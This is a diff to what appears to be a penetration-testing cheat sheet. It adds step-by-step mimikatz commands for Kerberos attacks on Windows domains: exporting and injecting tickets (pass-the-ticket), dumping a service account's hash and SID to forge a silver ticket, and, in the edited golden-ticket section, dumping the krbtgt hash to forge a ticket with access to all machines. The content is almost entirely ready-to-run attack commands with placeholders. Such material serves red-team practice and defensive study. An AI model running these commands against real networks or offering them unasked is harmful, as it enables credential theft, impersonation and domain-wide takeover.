@@ -356,15 +356,43 @@ rdesktop -u <USER> -p <PASS> <IP>:3389
 
 #### Pass The ticket
 
-> TODO
+- Export all the tickets into **.kirbi** files in the current directory:
 
-#### Silver ticket
+```cmd
+mimikatz # sekurlsa::tickets /export
+```
 
-> TODO
+- Impersonate a given ticket:
+
+```
+mimikatz # kerberos::ptt <ticket>
+```
+
+- Verify with `klist` (or with `kerberos::list` within mimikatz)  that we successfully impersonated the ticket by listing our cached tickets.
+
+#### Silver ticket (`mimikatz`)
+
+1. Dump the hash and security identifier (SID) of the targeted service account:
+	
+	```cmd
+	mimikatz # lsadump::lsa /inject /name:<SERVICE_NAME>
+	```
+
+2. Create a silver ticket:
+
+	```cmd
+	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SERVICE_SID> /krbtgt:<SERVICE_NTLM_HASH> /id:1103
+	```
+
+3. Open a new command prompt with elevated privileges with the given ticket:
+
+	```cmd
+	mimikatz # misc::cmd 
+	```
 
 #### Golden ticket (`mimikatz`)
 
-1. Dump the hash and security identifier (SID) of the Kerberos Ticket Granting Ticket account, allowing you to create a golden ticket:
+1. Dump the hash and security identifier (SID) of the Kerberos Ticket Granting Ticket (krbtgt) service account:
 	
 	```cmd
 	mimikatz # lsadump::lsa /inject /name:krbtgt
@@ -376,7 +404,7 @@ rdesktop -u <USER> -p <PASS> <IP>:3389
 	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /id:500
 	```
 
-3. Open a new command prompt with elevated privileges to all machines with:
+3. Open a new command prompt with elevated privileges and access to all machines with:
 
 	```cmd
 	mimikatz # misc::cmd 
